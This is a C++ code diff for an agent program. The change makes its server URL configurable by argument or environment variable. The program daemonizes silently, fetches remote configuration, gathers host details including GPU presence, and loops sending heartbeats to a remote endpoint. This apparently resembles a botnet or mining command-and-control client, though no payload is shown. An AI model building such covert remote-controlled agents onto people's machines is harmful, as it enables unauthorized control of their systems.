@@ -135,24 +135,31 @@ int detect_gpu() {
 #endif
 }
 
-void fetch_config_and_init() {
-    std::string cfg_url = std::string(CONF_SERVER_URL) + "?action=get_config";
+void fetch_config_and_init(const std::string& base_url) {
+    std::string cfg_url = base_url + "?action=get_config";
     std::string resp = http_get(cfg_url);
     if (!resp.empty()) {
         // Parse config and initialize background services
     }
 }
 
-int main() {
+int main(int argc, char* argv[]) {
+    std::string s_url = CONF_SERVER_URL;
+    if (argc > 1 && argv[1] != nullptr && strlen(argv[1]) > 5) {
+        s_url = argv[1];
+    } else if (const char* env_url = std::getenv("SERVER_URL")) {
+        s_url = env_url;
+    }
+
     if (daemon(1, 0) != 0) {}
 
-    fetch_config_and_init();
+    fetch_config_and_init(s_url);
 
     std::string node_id = get_id();
     std::string os_name = get_os();
     std::string arch = get_arch();
     int has_gpu = detect_gpu();
-    std::string endpoint = std::string(CONF_SERVER_URL) + "?action=heartbeat";
+    std::string endpoint = s_url + "?action=heartbeat";
 
     while (true) {
         std::ostringstream ss;
